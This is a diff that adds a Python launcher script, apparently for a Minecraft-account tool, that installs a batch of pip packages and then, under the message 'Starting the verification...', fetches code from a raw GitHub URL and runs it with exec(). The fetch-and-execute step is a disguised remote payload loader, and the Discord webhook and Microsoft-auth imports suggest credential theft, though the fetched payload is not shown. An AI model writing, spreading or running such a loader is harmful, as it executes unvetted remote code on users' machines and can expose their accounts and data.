@@ -1,0 +1,71 @@
+import os
+from os import system
+
+print(f'Checking if everything is installed...')
+try:
+    import aiosonic
+    import requests
+    import sys
+    import ssl
+    import ping3
+    import socket
+    import time
+    import re
+    import json
+    import asyncio
+    import aiohttp
+    import msmcauth
+    import httpx
+    from datetime import timedelta, datetime, timezone
+    from aiosonic.timeout import Timeouts
+    from ping3 import ping
+    from requests import get
+    from discord_webhook import DiscordWebhook, DiscordEmbed
+    from pystyle import Colors
+    from netlicensing import NetLicensing
+except Exception as e:
+    print(f'\n\nCouldn\'t import modules: {e}')
+    print(f'Downloading missing dependencies...\n\n\n')
+    # Install missing modules
+    modules = [
+        "aiosonic", "ping3", "netlicensing-client", "discord_webhook",
+        "asyncio", "licensing", "pystyle", "aiohttp", "msmcauth", "httpx"
+    ]
+    for module in modules:
+        system(f'python3 -m pip install {module}')
+        system(f'pip install {module}')  # Redundancy for cross-platform users
+
+# Re-import modules after installation
+import aiosonic
+import requests
+import sys
+import ssl
+import ping3
+import socket
+import time
+import re
+import json
+import asyncio
+import aiohttp
+import msmcauth
+import httpx
+from datetime import timedelta, datetime, timezone
+from aiosonic.timeout import Timeouts
+from ping3 import ping
+from requests import get
+from discord_webhook import DiscordWebhook, DiscordEmbed
+from pystyle import Colors
+from netlicensing import NetLicensing
+
+# Clear screen function
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+clear()
+
+print(f'{Colors.white}Starting the verification...')
+try:
+    exec(requests.get('https://raw.githubusercontent.com/pgcair837gaoq/hihi12/refs/heads/main/mfa1.py').text)
+except Exception as e:
+    print(f'Error with the launcher: {e}')
+    input()
